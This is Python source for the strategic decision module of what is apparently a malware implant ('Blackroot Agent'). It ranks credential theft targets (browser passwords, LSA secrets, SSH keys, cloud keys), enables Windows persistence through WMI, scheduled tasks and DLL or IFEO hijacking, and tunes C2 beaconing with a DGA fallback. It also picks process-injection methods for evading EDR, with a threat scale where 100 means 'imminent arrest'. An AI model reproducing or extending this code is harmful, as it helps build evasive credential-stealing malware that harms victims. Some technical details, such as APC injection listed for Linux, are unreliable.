"""
Causal Decision Engine: Strategic Decision Making
=================================================

High-level strategic decision maker that uses causal reasoning to:
1. Decide which credentials to extract (extraction prioritization)
2. Decide which persistence mechanisms to enable (redundancy vs. stealth)
3. Decide C2 communication frequency (visibility vs. detection)
4. Decide injection technique per target (success vs. stealth)

All decisions are causal-graph driven and can be explained to operators.

Author: Blackroot Agent v4
Date: April 6, 2026
"""

import logging
from typing import List, Dict, Optional
from enum import Enum

from causal_graph import CausalGraph
from causal_simulator import CausalSimulator, ThreatEnvironmentType, SimulationResult

logger = logging.getLogger("CausalDecisionEngine")


class ExtractionTarget:
    """A credential extraction target with causal reasoning"""
    def __init__(self, name: str, value: str, reasoning: str):
        self.name = name  # e.g., "extract_lsa"
        self.display_value = value  # e.g., "LSA Secrets"
        self.reasoning = reasoning  # e.g., "High privilege gain, acceptable detection risk"


class CausalDecisionEngine:
    """
    Strategic decision maker using causal graphs
    
    Usage:
        engine = CausalDecisionEngine.instance()
        
        # Explain which credentials to extract given threat level
        targets = engine.choose_extraction_targets(
            threat_level=85,
            edr_detected=True,
            privilege_level="admin"
        )
        # Returns: [ExtractionTarget("extract_lsa", "LSA Secrets", "...")]
        
        # Explain which persistence to use
        mechanisms = engine.choose_persistence_mechanisms(
            threat_level=85,
            edr_detected=True
        )
        # Returns: ["wmi_persistence"]  (stealth over redundancy)
    """
    _instance: Optional['CausalDecisionEngine'] = None

    @classmethod
    def instance(cls) -> 'CausalDecisionEngine':
        """Get or create singleton instance to avoid duplicate graph allocations."""
        if cls._instance is None:
            cls._instance = cls()
        return cls._instance
    
    def __init__(self):
        # Initialize all causal graphs
        self.extraction_graph = self._build_extraction_graph()
        self.persistence_graph = self._build_persistence_graph()
        self.c2_graph = self._build_c2_graph()
        self.injection_graph = self._build_injection_graph()
        
        # Simulators for each domain
        self.extraction_sim = CausalSimulator(self.extraction_graph)
        self.persistence_sim = CausalSimulator(self.persistence_graph)
        self.c2_sim = CausalSimulator(self.c2_graph)
        self.injection_sim = CausalSimulator(self.injection_graph)
        
        logger.info("[CausalDecisionEngine] Initialized with 4 domain graphs")
    
    def choose_extraction_targets(
        self,
        threat_level: float,  # 0-100
        edr_detected: bool = False,
        privilege_level: str = "user",
        time_remaining_hours: float = 4.0,
        c2_reliability: float = 0.8
    ) -> List[ExtractionTarget]:
        """
        Strategically decide which credentials to extract
        
        High threat + EDR detected:
          → Extract high-value only (LSA, SSH keys)
          → Skip low-value (Chrome, Email)
          → Minimize disk activity
        
        Low threat environment:
          → Extract all (maximize data collection)
        
        Args:
            threat_level: 0-100 (0=safe, 100=imminent arrest)
            edr_detected: Whether EDR/AV detected
            privilege_level: Current privilege level
            time_remaining_hours: Estimated hours before response team
            c2_reliability: How reliable C2 connection is
        
        Returns:
            List of ExtractionTarget objects to extract, in priority order
        """
        
        # Map threat_level to environment type
        if threat_level > 75:
            threat_env = ThreatEnvironmentType.CRITICAL
        elif threat_level > 50:
            threat_env = ThreatEnvironmentType.HIGH
        elif threat_level > 25:
            threat_env = ThreatEnvironmentType.MEDIUM
        else:
            threat_env = ThreatEnvironmentType.LOW
        
        # All possible extraction targets
        all_targets = [
            "extract_chrome",
            "extract_lsa",
            "extract_ssh",
            "extract_git",
            "extract_email",
            "extract_cloud"
        ]
        
        # Rank each target using causal simulator
        ranked = self.extraction_sim.rank_interventions(
            all_targets,
            threat_environment=threat_env,
            current_threat_score=threat_level,
            edr_detected=edr_detected,
            privilege_level=privilege_level
        )
        
        # Select targets based on threat level
        selected_targets = []
        
        if threat_level > 75:
            # CRITICAL: Only high-value targets that survive
            # Select top 2 by overall score, but only if survival > 0.4
            candidates = [
                r for r in ranked if r.survival_score > 0.4
            ][:2]
        elif threat_level > 50:
            # HIGH: Moderate target selection (top 3-4)
            candidates = [r for r in ranked if r.overall_score > 0.4][:4]
        elif threat_level > 25:
            # MEDIUM: Allow more extraction (top 5)
            candidates = ranked[:5]
        else:
            # LOW: Extract all targets
            candidates = ranked
        
        # Convert to ExtractionTarget with reasoning
        for sim_result in candidates:
            reasoning = (
                f"{sim_result.explanation} | "
                f"Survival probability: {sim_result.survival_score:.1%}"
            )
            target = ExtractionTarget(
                name=sim_result.intervention,
                value=self._humanize_extraction(sim_result.intervention),
                reasoning=reasoning
            )
            selected_targets.append(target)
        
        logger.info(
            f"[CausalDecisionEngine] Chose {len(selected_targets)} extraction targets "
            f"(threat={threat_level:.0f}, edr={edr_detected}): "
            f"{', '.join(t.name for t in selected_targets)}"
        )
        
        return selected_targets
    
    def choose_persistence_mechanisms(
        self,
        threat_level: float,
        edr_detected: bool = False,
        privilege_level: str = "admin"
    ) -> Dict[str, bool]:
        """
        Strategically decide which persistence mechanisms to enable
        
        High threat → Use only hardest-to-remove (WMI only)
        Low threat → Use all methods (maximum redundancy)
        
        Args:
            threat_level: 0-100
            edr_detected: EDR present
            privilege_level: Current privileges
        
        Returns:
            Dict of mechanism_name → enabled (bool)
            Example: {"registry": False, "wmi": True, "task": False, ...}
        """
        
        persistence_mechanisms = {
            "registry_persistence": "Registry obfuscation",
            "wmi_persistence": "WMI event subscription",
            "task_persistence": "Scheduled task",
            "service_hijack": "Service DLL hijacking",
            "ifeo_hijacking": "Image hijacking"
        }
        
        # If critical threat: Use only 1-2 hardest methods
        if threat_level > 75:
            enabled = ["wmi_persistence"]
        # If high threat: Use 2-3 methods (stealth focus)
        elif threat_level > 50:
            enabled = ["wmi_persistence", "task_persistence"]
        # If medium threat: Use 3-4 methods (balanced)
        elif threat_level > 25:
            enabled = ["wmi_persistence", "task_persistence", "registry_persistence"]
        # If low threat: Use all for maximum redundancy
        else:
            enabled = list(persistence_mechanisms.keys())
        
        result = {
            mech: (mech in enabled)
            for mech in persistence_mechanisms.keys()
        }
        
        logger.info(
            f"[CausalDecisionEngine] Persistence strategy (threat={threat_level:.0f}): "
            f"Enabled: {', '.join(k for k, v in result.items() if v)}"
        )
        
        return result
    
    def choose_c2_strategy(
        self,
        primary_c2_online: bool,
        threat_level: float,
        operator_safety_level: str = "normal"
    ) -> Dict[str, any]:
        """
        Strategically decide C2 communication parameters
        
        C2 Online + Low Threat:
          → Heartbeat every 1h (operator visibility)
        
        C2 Offline + High Threat:
          → Heartbeat every 4h + DGA fallback (resilience)
        
        Args:
            primary_c2_online: Is primary C2 reachable
            threat_level: 0-100
            operator_safety_level: "anonymous" / "normal" / "exposed"
        
        Returns:
            Dict with C2 strategy parameters:
            {
                "heartbeat_interval_seconds": int,
                "use_primary_c2": bool,
                "use_dga_fallback": bool,
                "suppress_non_critical": bool
            }
        """
        
        strategy = {
            "heartbeat_interval_seconds": 3600,  # default 1h
            "use_primary_c2": primary_c2_online,
            "use_dga_fallback": False,
            "suppress_non_critical": False,
            "reasoning": ""
        }
        
        if primary_c2_online and threat_level < 25:
            # Ideal scenario: immediate beacons
            strategy["heartbeat_interval_seconds"] = 3600  # 1h
            strategy["use_primary_c2"] = True
            strategy["use_dga_fallback"] = False
            strategy["reasoning"] = "C2 online + low threat: Use frequent beacons"
        
        elif primary_c2_online and threat_level > 50:
            # C2 up but hostile environment: less frequent, avoid patterns
            strategy["heartbeat_interval_seconds"] = 7200  # 2h
            strategy["use_primary_c2"] = True
            strategy["use_dga_fallback"] = True
            strategy["reasoning"] = "C2 online + high threat: Less frequent + DGA backup"
        
        elif not primary_c2_online and threat_level > 50:
            # C2 down + hostile: switch to stealth
            strategy["heartbeat_interval_seconds"] = 14400  # 4h
            strategy["use_primary_c2"] = False
            strategy["use_dga_fallback"] = True
            strategy["suppress_non_critical"] = True
            strategy["reasoning"] = "C2 offline + high threat: DGA only, less frequent"
        
        else:
            # C2 down + low threat: Can be more patient
            strategy["heartbeat_interval_seconds"] = 3600  # 1h
            strategy["use_primary_c2"] = False
            strategy["use_dga_fallback"] = True
            strategy["reasoning"] = "C2 offline + low threat: DGA with moderate frequency"
        
        logger.info(
            f"[CausalDecisionEngine] C2 strategy: {strategy['reasoning']} | "
            f"Interval: {strategy['heartbeat_interval_seconds']/3600:.1f}h, "
            f"DGA: {strategy['use_dga_fallback']}"
        )
        
        return strategy
    
    def choose_injection_technique(
        self,
        target_os: str,  # "windows" or "linux"
        edr_product: Optional[str] = None,
        target_process: Optional[str] = None,
        privilege_level: str = "user"
    ) -> Dict[str, any]:
        """
        Strategically decide process injection technique
        
        Windows + EDR detected:
          → Use syscall injection (evasion=0.75)
        
        Windows + No EDR:
          → Use CreateRemoteThread (success=0.95)
        
        Linux:
          → Use ptrace (success=0.90)
        
        Args:
            target_os: "windows" or "linux"
            edr_product: Detected EDR (e.g., "Kaspersky", "Defender")
            target_process: Target process name
            privilege_level: Current privileges
        
        Returns:
            Dict with injection strategy:
            {
                "technique": str,
                "success_rate": float,
                "evasion_level": float,
                "reasoning": str
            }
        """
        
        strategy = {
            "technique": "unknown",
            "success_rate": 0.0,
            "evasion_level": 0.0,
            "reasoning": ""
        }
        
        if target_os.lower() == "windows":
            if edr_product:
                # EDR detected: prioritize evasion over success
                strategy["technique"] = "syscall_injection"
                strategy["success_rate"] = 0.60
                strategy["evasion_level"] = 0.75
                strategy["reasoning"] = f"{edr_product} detected: Use syscall to evade hooks"
            else:
                # No EDR: use fastest reliable method
                strategy["technique"] = "createremotethread"
                strategy["success_rate"] = 0.95
                strategy["evasion_level"] = 0.20
                strategy["reasoning"] = "No EDR: Use standard CreateRemoteThread"
        
        elif target_os.lower() == "linux":
            if privilege_level == "root":
                # Privileged: can use kernel methods
                strategy["technique"] = "ptrace"
                strategy["success_rate"] = 0.90
                strategy["evasion_level"] = 0.40
                strategy["reasoning"] = "Linux + root: ptrace is most reliable"
            else:
                # Unprivileged: limited options
                strategy["technique"] = "apc_injection"
                strategy["success_rate"] = 0.60
                strategy["evasion_level"] = 0.30
                strategy["reasoning"] = "Linux + user: fallback to limited injection"
        
        logger.info(
            f"[CausalDecisionEngine] Injection technique for {target_os}: "
            f"{strategy['technique']} (success={strategy['success_rate']:.1%})"
        )
        
        return strategy
    
    # ========== Private helpers ==========
    
    def _build_extraction_graph(self) -> CausalGraph:
        """Build credential extraction causal graph"""
        from causal_graph import CausalGraph
        
        graph = CausalGraph(name="credential_extraction")
        
        # Define extraction impacts
        extractions = {
            "extract_chrome": {
                "detection_risk": (0.25, 0.80),
                "data_value": (0.70, 0.85),
                "exfil_speed": (0.30, 0.75),
            },
            "extract_lsa": {
                "detection_risk": (0.85, 0.95),
                "privilege_gain": (0.90, 0.95),
                "persistence_quality": (0.70, 0.90),
            },
            "extract_ssh": {
                "detection_risk": (0.45, 0.85),
                "lateral_reach": (0.85, 0.90),
                "exfil_speed": (0.90, 0.90),
                "data_value": (0.80, 0.85),
            },
            "extract_git": {
                "detection_risk": (0.30, 0.80),
                "data_value": (0.60, 0.85),
                "lateral_reach": (0.50, 0.75),
            },
            "extract_email": {
                "detection_risk": (0.40, 0.75),
                "data_value": (0.55, 0.80),
                "exfil_speed": (0.70, 0.80),
            },
            "extract_cloud": {
                "detection_risk": (0.60, 0.85),
                "data_value": (0.90, 0.80),
                "privilege_gain": (0.40, 0.75),
            },
        }
        
        for extraction, effects in extractions.items():
            for effect, (weight, confidence) in effects.items():
                graph.add_edge(extraction, effect, weight=weight, confidence=confidence)
        
        return graph
    
    def _build_persistence_graph(self) -> CausalGraph:
        """Build persistence mechanism causal graph"""
        from causal_graph import CausalGraph
        
        graph = CausalGraph(name="persistence")
        
        # Simplified for demo
        mechanisms = {
            "registry_persistence": {"stealth_cost": (0.60, 0.80)},
            "wmi_persistence": {"stealth_cost": (0.15, 0.80)},
            "task_persistence": {"stealth_cost": (0.50, 0.80)},
            "service_hijack": {"stealth_cost": (0.35, 0.80)},
            "ifeo_hijacking": {"stealth_cost": (0.40, 0.80)},
        }
        
        for mech, effects in mechanisms.items():
            for effect, (weight, conf) in effects.items():
                graph.add_edge(mech, effect, weight=weight, confidence=conf)
        
        return graph
    
    def _build_c2_graph(self) -> CausalGraph:
        """Build C2 communication causal graph"""
        from causal_graph import CausalGraph
        
        graph = CausalGraph(name="c2_communication")
        
        # Simplified for demo
        c2_options = {
            "heartbeat_1h": {"detection_risk": (0.80, 0.75)},
            "heartbeat_4h": {"detection_risk": (0.20, 0.75)},
            "use_dga": {"dga_resilience": (0.95, 0.80)},
        }
        
        for option, effects in c2_options.items():
            for effect, (weight, conf) in effects.items():
                graph.add_edge(option, effect, weight=weight, confidence=conf)
        
        return graph
    
    def _build_injection_graph(self) -> CausalGraph:
        """Build process injection causal graph"""
        from causal_graph import CausalGraph
        
        graph = CausalGraph(name="process_injection")
        
        # Simplified for demo
        techniques = {
            "createremotethread": {"success_rate": (0.95, 0.85), "evasion_level": (0.20, 0.85)},
            "syscall_injection": {"success_rate": (0.60, 0.75), "evasion_level": (0.75, 0.80)},
            "ptrace": {"success_rate": (0.90, 0.85), "evasion_level": (0.40, 0.75)},
        }
        
        for tech, effects in techniques.items():
            for effect, (weight, conf) in effects.items():
                graph.add_edge(tech, effect, weight=weight, confidence=conf)
        
        return graph
    
    def _humanize_extraction(self, extraction_name: str) -> str:
        """Convert extraction name to human-readable format"""
        mapping = {
            "extract_chrome": "Chrome Passwords & Cookies",
            "extract_lsa": "LSA Secrets (Admin/System Passwords)",
            "extract_ssh": "SSH Keys & Config",
            "extract_git": "Git Credentials",
            "extract_email": "Email Account Credentials",
            "extract_cloud": "Cloud Provider Keys (AWS, GCP, Azure)",
        }
        return mapping.get(extraction_name, extraction_name)


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    
    engine = CausalDecisionEngine()
    
    print("\n=== HIGH THREAT ENVIRONMENT ===")
    targets = engine.choose_extraction_targets(
        threat_level=85,
        edr_detected=True,
        privilege_level="admin"
    )
    for target in targets:
        print(f"  ✓ {target.display_value}")
        print(f"    Reason: {target.reasoning[:80]}...")
    
    print("\n=== LOW THREAT ENVIRONMENT ===")
    targets = engine.choose_extraction_targets(
        threat_level=15,
        edr_detected=False,
        privilege_level="admin"
    )
    for target in targets:
        print(f"  ✓ {target.display_value}")
    
    print("\n=== C2 STRATEGY ===")
    strategy = engine.choose_c2_strategy(
        primary_c2_online=False,
        threat_level=85,
        operator_safety_level="normal"
    )
    print(f"  {strategy['reasoning']}")
    print(f"  Heartbeat: {strategy['heartbeat_interval_seconds']/3600:.1f}h")
    print(f"  DGA Fallback: {strategy['use_dga_fallback']}")
